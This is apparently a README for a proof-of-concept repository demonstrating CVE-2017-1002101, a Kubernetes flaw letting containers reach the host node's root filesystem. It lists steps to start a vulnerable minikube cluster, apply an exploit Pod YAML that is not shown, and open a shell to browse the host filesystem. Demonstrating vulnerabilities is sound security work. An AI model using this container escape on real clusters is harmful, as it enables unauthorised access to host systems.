# Exploiting CVE-2017-1002101 in Kubernetes

This demonstrates a vulnerability in Kubernetes that allowed for containers to
access the underlying host node's root filesystem.

## Setup

Create a Kubernetes cluster using a vulnerable version, which is easily
accomplished with minikube: `minikube start --kubernetes-version v1.9.0`.

Next, create your Pod containing two containers by applying the YAML file in
this repository: `kubectl create -f cve-2017-1002101.yaml`

Finally, execute a shell within the second container and you will find the host
filesystem inside of the `/vol` directory: `kubectl exec -it poc -c
sploit-container -- /bin/sh`
